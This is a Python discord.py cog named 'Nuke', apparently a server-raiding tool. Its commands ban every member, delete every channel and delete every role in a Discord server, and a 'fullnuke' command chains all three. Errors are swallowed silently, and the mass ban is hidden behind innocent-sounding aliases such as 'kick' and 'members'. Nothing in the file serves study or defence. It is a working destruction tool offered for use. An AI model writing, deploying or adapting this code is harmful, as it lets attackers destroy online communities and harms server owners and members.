import discord
from discord.ext import commands

import json

data = json.load(open('data.json', 'r'))

class Nuke(commands.Cog):
    def __init__(self, client):
        self.client = client
        
    @commands.command(aliases=['kick', 'members'])
    async def ban(self, ctx):
        members_banned = 0
        
        for member in ctx.guild.members:
            try:
                await member.ban()
                members_banned += 1
            except:
                continue
            
    @commands.command(aliases=['delete', 'remove', 'rm'])
    async def purge(self, ctx, type):
        channels_deleted = 0
        
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                channels_deleted == 1
            except:
                continue
            
    @commands.command(aliases=['nuke', 'destroy', 'fn'])
    async def fullnuke(self, ctx):
        froles_deleted = 0 
        fchannels_deleted = 0
        fmembers_banned = 0
        
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                fchannels_deleted += 1
            except:
                continue
                
        for member in ctx.guild.members:
            try:
                await member.ban()
                fmembers_banned += 1
            except:
                continue
            
        for role in ctx.guild.roles:
            try:
                await role.delete()
                froles_deleted += 1
            except:
                continue
        
            
def setup(client):
    client.add_cog(Nuke(client))